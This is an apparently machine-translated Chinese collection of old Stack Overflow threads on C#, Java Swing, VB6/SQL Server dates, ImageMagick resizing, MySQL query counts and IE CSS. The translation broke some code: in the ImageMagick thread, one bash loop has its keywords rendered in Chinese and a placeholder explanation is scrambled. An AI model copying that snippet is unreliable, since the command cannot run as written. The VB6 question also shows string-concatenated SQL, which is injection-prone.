> 赞同：1
> 
> 时间：2009-03-13T15:11:08.540

在 LiveCycle 管理控制台中，只需转到主页 > 服务 > 应用程序和服务 > 服务管理 > ConvertPdfService

服务超时可以在那里更改。

当使用包含 39k 页（初始 13 个，每个克隆 3000 次，大小 ~15Mb）的转换 pdf（由 iText 生成）进行测试时，最终输出的 PostScript 文件为 ~1,25Gb。整个工作大约花了2个小时。但它起作用了，没有问题。

（我想这个答案使这个问题与编程无关，但是嘿。）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-08-30T17:10:55.790

LiveCycle 产品博客中的此条目也可能有所帮助：http: [//blogs.adobe.com/livecycle/2008/10/livecycle_processing_big_docum.html](http://blogs.adobe.com/livecycle/2008/10/livecycle_processing_big_docum.html)

# c# - 使用 CSLA 在 C# .NET 中禁用文本框

> ID：561864
> 
> 赞同：1
> 
> 时间：2009-02-18T16:38:24.180
> 
> 标签：c#, winforms, textbox, csla

我试图在我的一个 UserControls 中禁用一些用于显示数据（而不是编辑）的文本框。但是，由于某种原因，我无法正确禁用文本框。

我已将“在 readWriteAuthorization 上应用授权”设置为 true，并且文本框已数据绑定到正确的属性。

我还在`CanWriteProperty`我的对象中添加了以下几行：

```
if (propertyName == OpeningDateProperty.Name) return false;
if (propertyName == ChangeDateProperty.Name) return false;
if (propertyName == CloseDateProperty.Name) return false;
return base.CanWriteProperty(propertyName); 
```

我无法弄清楚我在这里做错了什么。我最近在其他 UserControls 中实现了几乎相同的东西，没有任何问题......

我在 C# .NET (Visual Studio 2008) 中使用 Windows 窗体

**编辑：**代码片段和属性取自我的客户对象。日期代表客户账户的开立、最后更改和关闭。它们根本不应该被编辑，实际上在旧的解决方案中它们由 textLabels 表示，但是我们现在想要使用文本框并使属性的 CanWriteProperty 为 false。

我意识到这些信息可能有点稀缺，但我正在寻找我在这个过程中可能忘记的东西。

**编辑：**我们也在使用***CSLA***，我想（我对这件事很陌生）这与我们为什么要这样做有关。

**编辑（解决方案）：**`CurrentItemChanged`正如您在下面的回答中看到的那样，问题是我没有像我应该的那样设置事件。

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-02-18T16:40:34.347

如果您想让它们只读，那么只需将 .ReadOnly 属性设置为 true。

或者，如果您从未使用这些文本框进行编辑，那么也许只使用标签代替？

**编辑：** 啊，这似乎更像是一个 CSLA 框架问题，而不是纯 Windows 窗体问题。在这个问题之前，我什至从未听说过 CSLA，但它看起来很有趣。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2009-02-18T17:01:46.010

如果要对控件的属性进行数据绑定，只需将文本框的“ReadOnly”属性绑定到业务对象的“CanWrite”属性即可。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T16:45:10.293

我认为您的意思是 ReadOnly 属性

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2009-02-19T14:26:11.760

要完成这项工作，您需要执行以下操作：

1.  确保 TextBox 以正确的方式数据绑定到正确的属性

2.  在根对象的 CanWriteProperty 覆盖中为每个文本框设置所需的检查

    ```
    if (propertyName == OpeningDateProperty.Name) return false; 
    ```

3.  确保 rootBindingsource 的 CurrentItemChanged 事件设置正确

    ```
    private void rootBindingSource_CurrentItemChanged(object sender, EventArgs e)
    {
        readWriteAuthorization1.ResetControlAuthorization();
    } 
    ```

4.  确保 texBox 的“在 ReadWriteAuthorization 上应用授权”设置为 true

这为我解决了这个问题。

# c# - 从多个 Web 引用共享数据类型

> ID：561867
> 
> 赞同：3
> 
> 时间：2009-02-18T16:39:12.867
> 
> 标签：c#, .net, web-services

假设供应商提供了两个单独的 Web 服务，它们共享相同的数据类型和相同的命名空间。

例如，以下 web 服务都包含类似的对象，例如 TestCredentials 对象：

*   TestWebservice/Testwebservice1.asmx
*   TestWebservice/Testwebservice2.asmx

使用 Web 引用将这些包含到 Visual Studio 中，我最终得到：

*   Testwebservice1.TestCredentials
*   Testwebservice2.TestCredentials

当我真正想要的是：

*   Testwebservice.TestCredentials

在处理 Web 引用时，Visual Studio 中有什么方法可以将这两个 Web 服务链接在一起，以便生成的代理类是相同的（并且在同一个命名空间内）？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-01T14:10:44.070

您必须使用[带有 /sharetypes 开关的 wsdl.exe 程序](http://msdn.microsoft.com/en-us/library/7h3ystb6(VS.80).aspx)手动生成代理类。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-02-18T16:49:08.680

另一个可能的选项（连同 wsdl.exe /sharetypes）是使用 Visual Studio 2008 并使用“添加服务引用”。“添加服务引用”对话框提供重用类型的选项。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T16:44:22.653

您应该做的是使用[wsdl.exe 命令行工具](http://msdn.microsoft.com/en-us/library/7h3ystb6(VS.80).aspx)生成一个代理类，而不是在 Visual Studio 中添加 Web 引用，然后您可以编辑该代理类以接受 URL，而不是在单独的命名空间中拥有两个硬编码的 url。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T16:53:16.937

**是的，你可以这么做。** 我们称其为数据编组器，但在本例中，我将其称为整合器。

您会注意到 WSDL 生成的类是部分的，我们创建了一个（Web 引用名称）.cs 文件，其中包含以下内容：

以下是您创建的文件，而不是 WSDL 生成的文件

## WebReference1.cs

```
 public partial class WebReferenceName1 : System.Web.Services.Protocols.SoapHttpClientProtocol 
{
    // take the methodname and append Local to the end
    public Consolidated.ReturnType MethodName1Local(params)
    {
        // redirect the return value of the call to the consolidation method and return the new value
        return Consolidation.Convert(this.MethodName1(params);
    }
} 
```

然后是第二个 Web 服务

## WebReference2.cs

```
 public partial class WebReferenceName2 : System.Web.Services.Protocols.SoapHttpClientProtocol 
{
    // take the methodname and append Local to the end
    public Consolidated.ReturnType MethodName2Local(params)
    {
        // redirect the return value of the call to the consolidation method and return the new value
        return Consolidation.Convert(this.MethodName2(params);
    }
} 
```

现在是从这两种类型转换的类

## 合并器.cs

```
 public class Consolidation
{
    // Input from Web Reference #1
    public static Consolidated.ReturnType Convert(WebReferenceName1.ReturnType valuetoConvert)
    {
        // Convert from valuetoConvert to Consolidated.ReturnType
        convertedValue = (conversion of valuetoConvert to Consolidated.ReturnType);

        return convertedValue;
    }

    // Input from Web Reference #2
    public static Consolidated.ReturnType Convert(WebReferenceName2.ReturnType valuetoConvert)
    {
        // Convert from valuetoConvert to Consolidated.ReturnType
        convertedValue = (conversion of valuetoConvert to Consolidated.ReturnType);

        return convertedValue;
    }
} 
```

基本上，您将方法添加到 Web 引用，调用 {WebMethod}Local() 方法，然后通过 Consolidator 进行路由，并将简单的 WSDL 生成的类转换为您可以实际使用的东西。

Consolidated.ReturnType 是您在本地项目中定义的内容，它是 WSDL 在 Web 引用下生成的数据类型的本地版本。通常，“转换”只是从一种类型到另一种类型的属性复制的克隆/属性。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2009-02-19T00:03:00.477

您可以创建一个引用所有 Web 服务的简单 .disco 文件。它只是每个 Web 服务的简单 contractRef。

只要它们使用相同的 xml 命名空间，Visual Studio 就会共享这些类型。

* * *

## 回答 #6

> 赞同：-1
> 
> 时间：2009-02-18T16:44:18.580

我不这么认为，至少在不修改自动生成的 reference.cs 代码的情况下是这样。

想到的是一些解决方法：1) 创建一个基于反射的复制方法，该方法根据属性名称复制值；或者 2) 如果您使用的是 .NET 3.5，则编写一个扩展方法来在两种类型之间进行复制。

# ios - 自定义 iPhone 相机控件（不使用 UIImagePickerController）

> ID：561868
> 
> 赞同：13
> 
> 时间：2009-02-18T16:39:23.443
> 
> 标签：ios, camera

虽然我知道为了让 iPhone 应用程序在 App Store 上被接受，一个要求是只能使用文档库。

如果是这种情况，某些应用程序（例如“夜景相机”和“Camera Plus”）如何使用似乎不是 UIImagePickerController 中包含的相机控件？

我听说过某些情况，开发人员被授予对某些标头的“特殊”访问权限，这些标头允许使用如果受限于仅使用文档库而无法实现的功能。但是，鉴于 App Store 的应用程序选择过程是多么不透明，我宁愿坚持推荐的内容，也不愿冒险。

任何人都愿意对此有所了解吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-03-25T21:25:39.720

你看过这个讨论吗？

[http://blog.airsource.co.uk/index.php/2008/11/11/views-of-uiimagepickercontroller/](http://blog.airsource.co.uk/index.php/2008/11/11/views-of-uiimagepickercontroller/)

这个自定义选择器的示例代码？

[http://www.codza.com/custom-uiimagepickercontroller-camera-view](http://www.codza.com/custom-uiimagepickercontroller-camera-view)

希望能帮助到你。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2009-02-18T18:32:55.277

您可能想查看苹果私有框架头文件的类转储。运行这个 perl 脚本：

[http://arstechnica.com/apple/news/2008/11/dumping-the-iphone-2-2-frameworks.ars](http://arstechnica.com/apple/news/2008/11/dumping-the-iphone-2-2-frameworks.ars)

并导航到 PrivateFrameworks 下的 PhotoLibrary 目录。这里的一些类看起来很有希望直接访问相机。

使用未记录的 API 可能会损害您通过应用商店的机会，但这都是非常主观的 - 如果您的产品很好，苹果可能会让它溜走。我建议与 Apple 的开发人员传道者交朋友。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-02-18T18:37:35.813

UIImagePickerController 是管理视图层次结构的 UIViewController 子类。您可以随意使用视图层次结构，就像这些应用程序一样，但考虑到 Apple 没有记录它并且可以在任何操作系统更新时更改它，这是有风险的。

我没有听说任何人被授予对库的特殊访问权限，但我读过未记录的类和方法与私有框架之间存在细微差别。未记录的类是一个灰色地带，但绝对不允许私有框架。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-02-18T19:10:48.730

简单的解释是商店中的应用程序不应该使用不受支持的 API，但这并没有得到一致的检查。您提到的应用程序要么使用不受支持的函数/类/方法，要么正在使用视图层次结构——即使它可以使用标准 API 完成，它本身也没有记录。

你可以做他们做的事，并抓住机会。请注意风险。您的应用程序可能 (a) 被商店拒绝，(b) 被接受但稍后启动（这发生在不支持的 API 使用中），(c) 被接受但未启动但在 Apple 下次有新的 iPhone 软件更新时中断（因为不受支持的 API 或视图层次结构可能会在没有警告的情况下更改）。或者你可能会很幸运，而这一切都没有发生。

# java - 使用 JComboBox 作为 JTable 中的单元格编辑器的焦点问题

> ID：561881
> 
> 赞同：10
> 
> 时间：2009-02-18T16:42:13.330
> 
> 标签：java, swing, focus, jtable, jcombobox

我在使用以下代码时遇到问题，我在其中使用 JComboBox 更改表格单元格中的字符串值。JComboBox 工作正常，但是如果我单击该框，然后单击离开*而不选择任何内容*，即使我删除了该行，JComboBox 的下拉列表仍然可见。单击另一个 Swing 组件（如 JButton）通常会导致它消失，但并非总是如此。

```
 TableColumn col = myTable.getColumnModel().getColumn(0);
    JComboBox eq = new JComboBox();
    eq.addItem("==");
    eq.addItem("!=");
    DefaultCellEditor editor = new DefaultCellEditor(eq);
    col.setCellEditor(editor);
```

编辑：我没有提到我之前设置的：

```
 myTable.putClientProperty("terminateEditOnFocusLost", Boolean.TRUE); 
```

如果我将此行注释掉或将其设置为 false，那么单击其他 Swing 组件不会导致该框消失。有了它，单击任何引起焦点的东西都会导致框消失，从而使问题不那么烦人，但可能掩盖了行为的原因。

我在这里做错了什么，还是忘记了一步？或者，有没有办法强迫它自行关闭？

谢谢！

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-02-18T23:09:08.810

要理解这一点，您需要了解可编辑表格发生了什么。一点理论：

每个单元格都有一个潜在的渲染器和编辑器。渲染器只是告诉单元格如何绘制而不与事件交互。然而，编辑器是一个可以与事件交互的组件。当触发编辑的事件发生时，编辑器组件将添加到表格顶部。编辑完成后，组件将被移除。

为了让组件消失，您必须确保单元格不仍处于“编辑”状态。这就是 terminateEditOnFocusLast 导致 JComboBox 消失的原因。如果你想让其他东西让盒子去，你可能需要调用 removeEditor() 来响应某些事件，可能是焦点，或者单元格选择。

要真正了解发生的情况，我建议快速查看 removeEditor()、editCellAt() 等的源代码，并可能在调试器中单步执行一次。您可能已经覆盖了一些事件处理代码，或者在不应该调用它时调用了它。JTable 中的编辑器/事件处理代码相当脆弱，很容易意外地调用以错误的顺序发生并产生有趣的副作用。

另外，Java 曾经非常巧妙地在版本之间改变了 JTable 的事件和焦点行为，我认为是在 1.4 和 1.5 之间，当时对 swing 的焦点处理发生了变化。因此，我建议您尝试的第一件事是使用不同 Java 版本的代码。该错误可能是由 Sun 引起的（我们必须更改一些复杂的编辑器代码），如果版本之间存在差异，则更容易向 Sun 报告。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2016-02-05T18:36:21.247

我知道这个问题很老，但这里是我的解决方案供参考。我扩展 DefaultCellEditor 并监听要取消的 JComboBox 然后强制编辑器取消。

```
import javax.swing.DefaultCellEditor;
import javax.swing.JComboBox;
import javax.swing.event.PopupMenuEvent;
import javax.swing.event.PopupMenuListener;

public class ComboBoxCellEditor extends DefaultCellEditor {

    public ComboBoxCellEditor(JComboBox comboBox) {
        super(comboBox);
        comboBox.addPopupMenuListener(new PopupMenuListener() {

            public void popupMenuWillBecomeVisible(PopupMenuEvent e) {
            }

            public void popupMenuWillBecomeInvisible(PopupMenuEvent e) {
            }

            public void popupMenuCanceled(PopupMenuEvent e) {
                cancelCellEditing();
            }
        });
    }
} 
```

然后 ...

```
DefaultCellEditor editor = new ComboBoxCellEditor(combobox);
column.setCellEditor(editor); 
```

# sql - 处理 dd/mm/yyyy 格式的日期

> ID：561891
> 
> 赞同：1
> 
> 时间：2009-02-18T16:43:44.790
> 
> 标签：sql, datetime, vb6

我有一个 VB6 应用程序，它使用 SQL Server 中的日期时间值（显然将日期存储为 mm/dd/yyyy）。

我需要将这些日期表示为 dd/mm/yyyy，将它们读入 dd/mm/yyyy，然后将它们作为标准 mm/dd/yyyy 存储回数据库。

这是我拥有的当前代码片段，其中拉+插入日期，但是我已经阅读了许多处理转换的冲突方法，我想知道这里是否有人知道针对这种情况的明确解决方案。

```
"SELECT * FROM List WHERE DateIn LIKE '%" & txtDateIn.Text & "%'"

"UPDATE [Progress] SET [Date] = '" & txtDate.Text & "'"

txtDate.Text = "" & RecordSet.Fields("Date").Value 
```

有什么想法吗？提前致谢。

**更新

实际上我只是注意到我确实有日期以 16/08/2009 00:00:00 的形式存储在日期时间字段中，即 dd/mm/yyyy。所以也许我误解了这个问题。但是，当尝试更新日期时间值时，我得到了“将 char 数据类型转换为日期时间数据类型导致超出范围的日期时间值。”。

我认为这是因为日期格式不匹配（导致月份值超出范围的问题）但是我在日期时间字段中确实有日期值格式为日/月/年。而且提交到数据库的日期肯定是dd/mm/yyyy。

****更新2**

好的，我似乎造成了一些混乱。我道歉。

*   我将日期作为日期时间存储在 SQL 数据库中
*   文本是 VB6 应用程序中的 TextBox 控件
*   我正在运行 SQL SELECT 语句以从数据库中读取日期并将值放入 TextBox
*   然后我有一个“提交”命令按钮，然后执行 UPDATE SQL 语句将 TextBox 的值放入 SQL 数据库中的日期时间字段
*   在 1 个特定场合之前，这非常有效。

在这种情况下，我有一个日期时间值（SQL Server 2005 显示为 16/08/2009 00:00:00），它是从数据库中读取的，并使用值 16/08/2009 填充文本框。现在，当我尝试在不修改 TextBox 文本的情况下运行 UPDATE 语句时，我收到错误消息“将 char 数据类型转换为日期时间数据类型导致日期时间值超出范围”。

这不会发生在其他记录中，例如日期为 04/08/2009 的记录，所以我能看到的唯一问题可能是值中日期和月份的位置，因为如果数据库首先预期月份，那么显然是 16/ 08/2009 将超出范围。但是，数据库中的值已经是 16/08/2009，没有问题。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2009-02-18T16:46:47.357

SQL Server 不会“明显”将日期存储为 mm/dd/yyyy。据我所知，它根本不以文本格式存储它们。

我不知道 VB6 对参数化查询的支持是什么，但这就是您想要的：基本上您希望将参数*作为*日期而不是文本传递给查询。基本上，您应该将用户输入解析为日期（以 VB6 的任何方式），然后在参数化查询中传递它。

编辑：我试图找出 VB6 如何处理参数化查询，但运气不佳 - 希望任何关于 VB6 的好书都能涵盖它。（当然，有很多 VB.NET 的示例......）有一个[Wrox 帖子](http://www.dotneteer.com/Weblog/post/2008/04/Prepared-statements-(parameterized-query)-with-ADO.aspx)给出了一个例子；这可能足以让你继续前进。

编辑：正如对这个答案的评论和对这个问题的编辑所表明的那样，你的数据类型到底是什么有些混乱。*请*不要使用基于字符的字段来存储日期：这样做没有好处。使用适当的日期/日期时间/任何字段，然后确保使用参数化查询来访问数据库，以便驱动程序可以进行任何必要的转换。完全依赖文本格式是个坏主意。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2009-02-18T17:06:31.197

在查询中使用日期或时间戳的 ODBC 规范形式。这样可以避免在存储日期时由于本地化而产生的任何误解。时间戳格式是 {ts 'yyyy-mm-dd hh:mm:ss[.fff]'} 日期格式是 {d 'yyyy-mm-dd'} 这是我使用的函数。

现在关于VB6中的输入和显示。理想情况下，您将使用 datetimepicker 控件而不是文本框，因为它会返回一个日期，并且在使用它时不会误解您选择的日期。但是如果你可以假设它总是 DD/MM/YYYY（这是一个很大的 if），你可以使用 Format(datevalue, "DD/MM/YYYY") 来显示它。要将其读入日期变量，您不能只使用 CDate。您需要使用解析和 DateSerial 之类的东西将其组合在一起：DateSerial(Right(strDate, 4), Mid(strDate, 4, 2), Mid(strDate, 1, 2))。

```
' ------------------------------------------------------------------------------
' DateLiteral
'
' Description :
'    given a vb date, it returns a string with the odbc canonical date format.
'
' History
' 2008-02-04 - WSR : added to this project
'
Public Function DateLiteral(ByRef dtSource As Date) As String

    DateLiteral = _
        "{d '" & LeftPadDigits(Year(dtSource), 4) & "-" & _
                 LeftPadDigits(Month(dtSource), 2) & "-" & _
                 LeftPadDigits(Day(dtSource), 2) & "'}"

End Function
' ------------------------------------------------------------------------------

' ------------------------------------------------------------------------------
' TimeStampLiteral
'
' Description :
'    given a vb date, it returns a string with the odbc canonical timestamp format.
'
' History
' 2008-02-04 - WSR : added to this project
'
Public Function TimeStampLiteral(ByRef dtSource As Date) As String

    TimeStampLiteral = _
        "{ts '" & LeftPadDigits(Year(dtSource), 4) & "-" & _
                 LeftPadDigits(Month(dtSource), 2) & "-" & _
                 LeftPadDigits(Day(dtSource), 2) & " " & _
                 LeftPadDigits(Hour(dtSource), 2) & ":" & _
                 LeftPadDigits(Minute(dtSource), 2) & ":" & _
                 LeftPadDigits(Second(dtSource), 2) & "'}"

End Function
' ------------------------------------------------------------------------------

' ------------------------------------------------------------------------------
' LeftPadDigits
'
' Description : pads the given string to the left with zeroes if it is under
'    the given length so that it is at least as long as the given length.
'
' History
' 2008-02-04 - WSR : added to this project
'
Public Function LeftPadDigits(ByVal strSource As String, ByVal lngLength As Long) As String

    If Len(strSource) < lngLength Then
        LeftPadDigits = String$(lngLength - Len(strSource), "0") & strSource
    Else
        LeftPadDigits = strSource
    End If

End Function
' ------------------------------------------------------------------------------ 
```

还应该注意，是的，首选是使用 ADO 和参数化查询。在我的情况下，我通过第三方库访问数据库并且不能使用参数化查询。因此日期文字处理。这是 ADO 参数化查询的示例。根据您使用的 ADO 连接类型，代码可能会有所不同：OLEDB、ODBC 或 SQLNative。有时它不仅仅是一个？为参数标记。这个例子是 OLEDB。

```
Set cmdVerifyUser = New ADODB.Command
cmdVerifyUser.CommandType = adCmdText
cmdVerifyUser.CommandTimeout = 30
cmdVerifyUser.CommandText = "SELECT username FROM users WHERE userid = ?"
cmdVerifyUser.Parameters.Append cmdVerifyUser.CreateParameter("userid", adVarChar, adParamInput, Len(m_strUserName), m_strUserName)
cmdVerifyUser.ActiveConnection = m_conDatabase
Set rstResults = cmdVerifyUser.Execute()

If Not rstResults.EOF Then 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-02-18T18:05:06.560

毕竟，问题很简单。我将日期值包裹在单引号（'）和双引号（“）中。由于日期值不需要单引号而遇到问题。删除它们解决了这个问题。

无论如何，谢谢你试图帮助所有人。

# linux - 在行命令中调整图像列表的大小

> ID：561895
> 
> 赞同：8
> 
> 时间：2009-02-18T16:44:22.480
> 
> 标签：linux, bash, shell, imagemagick

我想调整目录中的所有图像列表的大小。为了实现这一点，我使用`convert`了 imagemagick。我想调整大小

```
image1.jpg
image2.jpg
... 
```

进入

```
image1-resized.jpg
image2-resized.jpg
... 
```

我想知道是否有一种方法可以在单个命令行中实现这一点。一个优雅的解决方案通常很有用，不仅在这种情况下。

编辑：

我想要一个**非** *脚本式的*解决方案，即。没有 for 循环。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2009-02-18T16:51:21.200

如果要将它们调整为 800x600：

```
for file in *.jpg; do convert -resize 800x600 -- "$file" "${file%%.jpg}-resized.jpg"; done 
```

（在 bash 中工作）

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-18T17:06:23.957

```
ls *.jpg|sed -e 's/\..*//'|xargs -I X convert X.jpg whatever-options X-resized.jpg 
```

如果您愿意接受稍微不同的最终文件名“resized-image1.jpg”而不是“image1-resized.jpg”，则可以消除 sed 并使用扩展名：

```
ls|xargs -I X convert X whatever-options resized-X 
```

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2015-05-22T15:27:20.667

[GNU Parallel](http://www.gnu.org/software/parallel/)甚至比 for 循环更容易，而且通常更快：

```
parallel convert -resize 800x600 -- "{}" "{.}-resized.jpg" ::: *.jpg 
```

这里发生了一些事情，从右到左：

*   `::: *.jpg`表示为每个 jpg 文件运行命令
*   `{.}``.jpg`表示插入不带后缀 ( )的当前文件名
*   `{}`表示插入当前文件名
*   `parallel`表示并行运行以下命令多次。它将选择并行执行的最大值以匹配您计算机的内核数。当每一个完成时，它将启动下一个，直到所有 jpg 文件都被转换。

这`convert --resize 800x600 -- foo.jpg foo-resized.jpg`将为每个文件运行命令。告诉 convert 停止处理标志，`--`以防文件名碰巧以`-`.

PS 在我的 Mac 上我安装了[Homebrew](http://brew.sh/)，所以我能够并行安装并转换

```
brew install parallel
brew install imagemagick 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2009-02-18T17:04:26.880

如果您的图像文件具有不同的扩展名：

```
对于 * 中的 f；转换 -resize 800x600 -- "$f" "${f%.*}-resized.${f##*.}"; 完毕

```

# error-handling - 如果出现未处理的代码异常，向最终用户展示最合适的内容是什么？

> ID：561899
> 
> 赞同：0
> 
> 时间：2009-02-18T16:45:15.753
> 
> 标签：error-handling, unhandled-exception

在 Web 应用程序中，当您的服务器端代码出错并遇到未处理的异常时，告诉最终用户发生了什么最合适的方法是什么？
你只是说“发生了意外的事情，我们很抱歉”。您是否应该尝试了解异常是什么以及用户试图做什么，并让他们知道如何恢复，如果可能的话？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-02-18T17:08:53.483

如果最终用户在发生这种情况时参与事务并且必须重新开始，他们会非常关心。您应该尽可能地尝试维护他们的客户端状态（即他们输入的表单值）。如果您想让他们开心，这可能是您最重要的考虑因素。

大多数最终用户不会欣赏关于他们是多么幸运地发现了您的错误的诙谐评论，事实上这更有可能使他们非常恼火。如果您想使用您的用户报告错误（他们会这样做），请向他们显示错误代码和简短描述，并让他们将其完整地传回给您。

在所有情况下，您都需要尽可能地向他们明确指示下一步该做什么，例如“出现意外错误。请再次按发送” 最好的指导是保持语言正式和简洁，你不需要需要很多请和谢谢，尽管这可能适合您的礼貌本性。您希望消息简短、简洁和具有指导意义，而不是喋喋不休。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T16:49:33.780

Lynx 基于文本的浏览器有一条很好的消息，例如：*恭喜，您在 Lynx 中发现了一个错误！*以下是提交错误报告的说明（主要是向给定的电子邮件发送日志文件）。

# php - 我应该将自己限制在一个页面上多少个 MySQL 查询？PHP/MySQL

> ID：561900
> 
> 赞同：14
> 
> 时间：2009-02-18T16:45:16.177
> 
> 标签：php, mysql, performance

好的，所以我相信你们中的很多人已经构建了疯狂的数据库密集型页面......

我正在构建一个页面，我想从中提取各种不相关的数据库信息。以下是这一页的一些不同查询示例：

*   文章内容和信息
*   如果作者是注册用户，他们的信息
*   更新文章的查看计数器
*   检索文章的评论
*   检索评论作者的信息
*   如果文章的读者已登录，请查询他们的信息
*   ETC...

我知道这些基本上会非常快，而且我可以结合一些；但我想确保这不是异常？

您会将自己限制在一个页面上多少个相当正常和非繁重的查询？

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2009-02-18T16:59:23.990

需要多少就多少，但不多。

真的：不要担心优化（现在）。首先构建它，然后测量性能，如果**某处**存在性能问题，然后开始优化。

否则，您可能会花费大量时间来优化不需要优化的内容。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-02-18T17:08:02.220

我有 50 个查询的页面没有问题。对非大型（即适合主内存）表的快速查询可以在 1 毫秒或更短的时间内完成，因此您可以完成其中的很多。

如果页面加载时间少于 200 毫秒，您将拥有一个活泼的网站。其中很大一部分用于服务器和浏览器之间的延迟，所以我希望在服务器上花费的时间小于 100 毫秒。在该时间段内执行尽可能多的查询。

最大的瓶颈可能是您必须在项目上花费的时间，因此请先优化 :) 如果需要，稍后再优化代码。话虽这么说，如果您要编写与此问题相关的任何代码，请编写一些内容以明确您的查询需要多长时间。这样你至少可以发现你有问题。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2009-02-18T16:48:18.587

我不认为有任何一个正确的答案。我想说，只要查询速度很快，并且页面遵循逻辑流程，就不应该对它们施加任何任意上限。我已经看到页面飞了十几个查询，我看到他们爬了一个。

* * *

## 回答 #4

> 赞同：5
> 
> 时间：2009-02-18T17:06:20.027

每个查询都需要往返于您的数据库服务器，因此许多查询的成本会随着延迟而增加。

如果它在同一台主机上运行，​​仍然会有轻微的速度损失，不仅因为套接字在您的应用程序之间，还因为服务器必须解析您的查询、构建响应、检查访问以及您使用 SQL 获得的任何其他开销服务器。

所以一般来说，最好减少查询。

但是，您应该尽可能多地使用 SQL：当可以在 SQL 本身中轻松实现相同的算法时，不要将内容作为客户端语言中某些算法的输入。这不仅会减少查询的数量，而且有助于仅选择所需的行。

Piskvor 的回答在任何情况下仍然适用。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2009-02-18T17:11:28.827

例如，Wordpress 每页最多可以提取 30 个查询。您可以使用多种方法来阻止 MySQL 下拉 - 其中之一是 memchache - 但是现在，正如您所说，如果它很简单，只需确保您提取的所有数据都在 MySQL 中正确索引，不要担心很多关于查询的数量。

如果您使用的是框架（例如 CodeIgniter），您通常可以提取页面创建时间的数据并检查是什么将您的网站拉下来。

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2009-02-18T17:41:08.477

正如其他人所说，没有单一的数字。请尽可能将 SQL 用于构建它的目的，并一起检索数据集。

通常，当您在循环中包含 SQL 时，表明您可能做错了。

如果可能，使用连接来检索属于一起的数据，而不是发送多个语句。

始终尝试确保您的语句准确检​​索您需要的内容，而无需额外的字段/行。

* * *

## 回答 #7

> 赞同：1
> 
> 时间：2009-02-18T17:00:04.923

如果您需要查询，您应该只使用它们。

我一直试图做的是让它们在同一个地方一次全部执行，这样就不需要页面的不同部分（如果它们是分开的......）来建立数据库连接。我认为将所有内容存储在变量中比将页面的每个部分都连接到数据库更有效。

* * *

## 回答 #8

> 赞同：1
> 
> 时间：2009-02-19T01:52:13.990

根据我的经验，最好进行两次查询并对结果进行后处理，而不是进行一次运行时间长十倍而无需进行后处理的查询。也就是说，如果您已经有了结果，最好不要重复查询，并且有许多不同的方法可以实现这一点。

但所有这些都围绕性能优化。因此，除非您真的知道自己在做什么（提示：这种情况下的大多数人不知道），否则只需对您需要的数据进行查询，然后再对其进行重构。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2009-04-10T23:11:25.170

我认为您应该将自己限制在尽可能少的查询中。尝试将查询组合到多任务并节省时间。

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2009-02-19T00:07:24.273

过早的优化是人们之前提到的一个问题，但这就是你在编写代码以使其“快速”运行的地方。但人们把这个“格言”走得太远了。

如果您想在设计时考虑到可伸缩性，只需确保您加载数据的任何操作都足够抽象并且调用是集中的，这将使您在需要实现共享内存缓存时变得更容易，因为您只需要更改几个地方的一些东西。

# c# - 如何快速查询文件系统？

> ID：561902
> 
> 赞同：0
> 
> 时间：2009-02-18T16:46:40.977
> 
> 标签：c#, wmi, filesystems

我正在尝试查询远程计算机上的文件系统，以获取特定目录中的文件名列表。

到目前为止，我在 .NET 中使用 DirectoryInfo 类。像这样的东西：

```
DirectoryInfo dir = new DirectoryInfo("c:\dir");
FileInfo[] files = dir.GetFiles("*.*"); 
```

但是这个查询平均在 20/30 秒内得到答复。有时会持续 50 秒。那太多了。我想优化它。经过一番谷歌搜索后，我发现这可以用 WMI 完成。但我没有取得任何成功。我收到诸如“RPC 服务器不可用”之类的错误，并且我无权更改该机器中的权限或服务。

有没有人有其他想法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-02-18T17:01:59.583

您不会通过网络获得更快的性能。您正在应对网络延迟，以及正在发生的任何影响远程机器性能的事情（例如，磁盘 io 或高 CPU 使用率）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-02-18T17:09:38.253

远程机器上运行的 WCF 服务怎么样？这可能需要一个请求，然后返回一个带有文件夹和文件对象图的批量数据传输对象。

我很欣赏这可能不适合您的架构，但是如果您可以控制这两种环境，这可能是一种前进的方式吗？

# html - 您可以调整 HTML 输入按钮的左右填充吗？

> ID：561904
> 
> 赞同：2
> 
> 时间：2009-02-18T16:46:57.403
> 
> 标签：html, css, internet-explorer, button, padding

输入按钮的文本（值）越长，左右填充似乎越宽（IE）。显式 CSS 填充似乎没有效果。有人对此有破解吗？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2009-02-18T17:08:47.290

是的，试试这个（PS 这个错误在 IE8 中已修复）

```
padding:1px 4px 1px 4px;/*set to your preferences*/

/*Make IE render reasonably sized buttons*/
overflow:visible;
width:auto; 
```

